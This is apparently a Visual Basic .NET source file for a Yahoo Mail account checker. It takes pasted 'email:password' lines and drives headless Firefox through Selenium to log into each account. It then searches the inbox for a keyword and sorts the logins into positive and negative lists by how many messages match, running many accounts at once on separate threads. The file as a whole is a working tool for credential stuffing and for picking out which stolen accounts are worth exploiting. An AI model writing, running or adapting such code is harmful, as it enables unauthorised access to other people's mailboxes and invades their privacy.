Imports OpenQA.Selenium
Imports OpenQA.Selenium.Firefox
Imports System.Text.RegularExpressions
Imports System.Threading
Public Class Form1
    Dim Emails As New List(Of String)
    Dim Passwords As New List(Of String)
    Dim Finished As New List(Of String)
    Dim TotalTasks As Integer = 0
    Dim WorkingTasks As Integer = 0
    Dim WO As Integer = 0
    Dim Starting As Boolean = False
    Public Function NL(txt As String)
        Output.Text += txt & vbNewLine
    End Function
    Public Function NLO(txt As String)
        Output.Text += "* " + txt + " *" & vbNewLine
    End Function
    Public Function SplitEmail(Log)
        Dim Email As String = Log.Split(":"c)(0)
        Return Email
    End Function
    Public Function SplitPass(Log)
        Dim Pass As String = Log.Split(":"c)(1)
        Return Pass
    End Function
    Public Function UpdateLabel()
        Label7.Text = "Working on task " + WorkingTasks.ToString + "/" + TotalTasks.ToString
    End Function
    Public Function Start(which As Integer)
        Try
            Dim TotalEmails = 0
            WorkingTasks += 1
            UpdateLabel()
            Dim Email = Emails(which - 1)
            NLO("[" + Email + "] " + "Starting")
            Dim site = "https://login.yahoo.com"

            Dim cc = New FirefoxOptions()
            cc.AddArguments("--headless", "--no-sandbox", "--disable-web-security", "--disable-gpu", "--incognito", "--proxy-bypass-list=*", "--proxy-server='direct://'", "--log-level=3", "--hide-scrollbars", "--disable-extensions")
            'Dim Browser = New FirefoxDriver("C:\", cc)

            Dim chromeDriverService = FirefoxDriverService.CreateDefaultService("C:\")
            chromeDriverService.HideCommandPromptWindow = True
            Dim Browser = New FirefoxDriver(chromeDriverService, cc)

            Browser.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10)

            Browser.Navigate.GoToUrl(site)

            NLO("[" + SplitEmail(Email) + "] " + "Logging in")

            Browser.FindElement(By.XPath("/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/form/div[1]/div[3]/input")).SendKeys(SplitEmail(Email)) 'Email Input
            Browser.FindElement(By.XPath("/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/form/div[1]/div[3]/input")).SendKeys(Keys.Enter)

            Thread.Sleep(2000)

            Browser.FindElement(By.XPath("/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/form/div[2]/input")).SendKeys(SplitPass(Email)) 'Password Input
            Browser.FindElement(By.XPath("/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/form/div[2]/input")).SendKeys(Keys.Enter)

            Try
                Dim SuccessOrNot As Boolean = Browser.FindElement(By.XPath("/html/body/header/div[1]/div/div/div/div/div[3]/div/div[3]/div[3]/div/a/span[1]")).Displayed()
                NLO("[" + SplitEmail(Email) + "] " + "Sucessfully logged in")
            Catch Ex As Exception
                NLO("[" + SplitEmail(Email) + "] " + "Failed to log in")
                ' Start(CurrentOne)
                WO -= 1
                Browser.Quit()
                Exit Function
                Return False
            End Try
            Browser.Navigate.GoToUrl("https://mail.yahoo.com/d/search/keyword=" + Search.Text)

            Thread.Sleep(1500)

            Dim AllEmails = Browser.FindElements(By.XPath("/html/body/div[1]/div/div[1]/div/div[2]/div/div[2]/div[1]/div/div/div[3]/div/div/div[2]/div/div[1]/ul"))

            For i As Integer = 1 To AllEmails.Count
                TotalEmails += 1
            Next

            NLO("[" + SplitEmail(Email) + "] " + "Found " + TotalEmails.ToString + " emails containing " + Search.Text)

            If TotalEmails >= bb.Value Then
                NLO("Adding " + Email + " to positive list")
                Positive.Text += Email + ":" + SplitPass(Email) & vbNewLine
            Else
                NLO("Adding " + Email + " to negative list")
                Negative.Text += Email + ":" + SplitPass(Email) & vbNewLine
            End If

            Browser.Quit()

        Catch ex As Exception
            TextBox1.Text += Emails(which) & vbNewLine
        End Try
        WO -= 1
        Exit Function
    End Function
    Public Function Begin()
        For i As Integer = 0 To Emails.Count - 1
            While WO >= tt.Value

            End While
            WO += 1
            Dim Thrd = New Thread(Sub() Start(i))
            Thrd.Start()
        Next
    End Function
    Public Function Split()
        If Search.TextLength <= 1 Then
            MsgBox("Please input a search")
            Return False
        End If
        Output.Text = ""
        NLO("Splitting emails and passwords...")
        For Each Log As String In Logs.Lines
            If Log = "" Then
                MsgBox("Please remove any empty lines and spaces")
                Return 0
            End If

            If Log.Contains(" ") Then
                MsgBox("Please remove any empty lines and spaces")
            End If
            Dim Email As String = Log.Split(":"c)(0)
            Dim Pass As String = Log.Split(":"c)(1)
            NL("Email: " + Email)
            NL("Password: " + Pass)
            Emails.Add(Log)
            TotalTasks += 1
        Next
        NLO("Finished splitting")
        NLO("Starting threads")
        Dim t As New Thread(AddressOf Begin)
        t.Start()
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Logs.Lines = Logs.Lines.Where(Function(line) line <> String.Empty).ToArray()
        Logs.Text = Logs.Text.Replace(" ", "")
        If Starting = True Then
            MsgBox("Already running!")
            Return
        End If
        Starting = True
        Split()
    End Sub
    Private Sub Output_TextChanged(sender As Object, e As EventArgs) Handles Output.TextChanged
        Output.SelectionStart = Output.Text.Length
        Output.ScrollToCaret()
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False

    End Sub

    Private Sub Logs_TextChanged(sender As Object, e As EventArgs) Handles Logs.TextChanged
        Dim Linez As Integer = Logs.Lines.Count
        Label1.Text = Linez.ToString + " Logs"
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Form2.Close()
    End Sub
End Class